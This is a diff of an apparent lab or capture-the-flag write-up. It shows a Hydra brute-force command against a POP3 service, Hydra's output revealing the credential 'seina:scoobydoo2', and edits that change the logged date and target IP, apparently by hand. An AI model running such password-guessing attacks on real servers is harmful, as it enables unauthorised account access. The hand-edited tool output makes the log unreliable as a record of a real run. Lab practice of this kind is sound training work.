@@ -86,11 +86,11 @@ seina:scoobydoo2
 hydra -L usernames.txt -P passwords.txt pop3://10.10.157.167
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-03 19:05:30
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-20 19:05:30
 [INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 72 login tries (l:9/p:8), ~5 tries per task
-[DATA] attacking pop3://10.10.137.20:110/
-[110][pop3] host: 10.10.137.20   login: seina   password: scoobydoo2
+[DATA] attacking pop3://10.10.157.167/
+[110][pop3] host: 10.10.157.167   login: seina   password: scoobydoo2
 1 of 1 target successfully completed, 1 valid password found
 ```
 #### We confirm that 1 account is still valid: ```seina:scoobydoo2```
